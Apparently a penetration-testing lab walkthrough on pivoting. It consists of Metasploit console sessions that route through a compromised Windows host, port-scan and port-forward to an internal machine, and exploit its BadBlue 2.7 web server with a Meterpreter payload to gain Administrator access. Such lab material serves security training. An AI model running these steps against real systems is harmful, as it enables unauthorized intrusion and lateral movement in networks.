# Pivoting

Connected to first victim
```bash

meterpreter > sysinfo 
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator

meterpreter > ifconfig 

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : AWS PV Network Device #0
Hardware MAC : 0e:a7:03:66:10:6d
MTU          : 9001
IPv4 Address : 10.4.28.6
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::5491:18f9:aa63:f469
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 14
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a04:1c06
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
```

```bash
meterpreter > run autoroute -s 10.4.28.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.4.28.0/255.255.240.0...
[+] Added route to 10.4.28.0/255.255.240.0 via 10.4.28.6
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.4.28.0          255.255.240.0      Session 1
```

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       10.4.28.6        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.4.27.47
RHOSTS => 10.4.27.47
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-100
PORTS => 1-100
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.4.27.47:           - 10.4.27.47:80 - TCP OPEN
[*] 10.4.27.47:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf6 auxiliary(scanner/portscan/tcp) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.22.2:4444 -> 10.4.28.6:49251 (10.4.28.6)


msf6 auxiliary(scanner/portscan/tcp) > sessions 1
[*] Starting interaction with 1...


meterpreter > portfwd add -l 1234 -p 80 -r 10.4.27.47
[*] Local TCP relay created: :1234 <-> 10.4.27.47:80
```

```bash
root@attackdefense:~# nmap -sV -sC -p 1234 localhost
Starting Nmap 7.91 ( https://nmap.org ) at 2024-04-09 17:14 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000057s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.00 seconds
```

```bash
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/http/badblue_passthru
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.4.28.6        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.22.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp

msf6 exploit(windows/http/badblue_passthru) > set RHOST 10.4.27.47
RHOST => 10.4.27.47

msf6 exploit(windows/http/badblue_passthru) > run

[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.4.27.47:4444
[*] Sending stage (175174 bytes) to 10.4.27.47
[*] Meterpreter session 2 opened (10.4.28.6:49486 -> 10.4.27.47:4444) at 2024-04-09 17:16:02 +0530

meterpreter > sysinfo 
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid 
Server username: ATTACKDEFENSE\Administrator
```